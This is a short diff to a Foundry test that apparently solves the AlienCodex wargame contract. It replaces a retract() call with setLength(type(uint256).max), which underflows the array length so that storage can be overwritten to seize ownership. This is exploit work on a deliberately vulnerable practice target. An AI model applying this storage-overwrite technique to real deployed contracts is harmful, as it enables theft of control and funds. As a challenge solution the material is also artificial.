@@ -12,6 +12,7 @@ interface AlienCodex {
     function makeContact() external;
     function record(bytes32) external;
     function retract() external;
+    function setLength(uint256) external;
     function revise(uint256, bytes32) external;
     function owner() external view returns (address);
 }
@@ -67,7 +68,8 @@ contract TestAlienCodex is Test, Utils {
     function testSolve() public checkSolvedByPlayer{
         console.logBytes32(bytes32(uint256(uint160(instance.owner()))));
         instance.makeContact();
-        instance.retract();
+        // instance.retract(); // Has same effect as setLength(type(uint256).max) since it underflows the length of the array.
+        instance.setLength(type(uint256).max);
         bytes32 slot0 = vm.load(address(instance), bytes32(0));
         console.logBytes32(slot0);
 
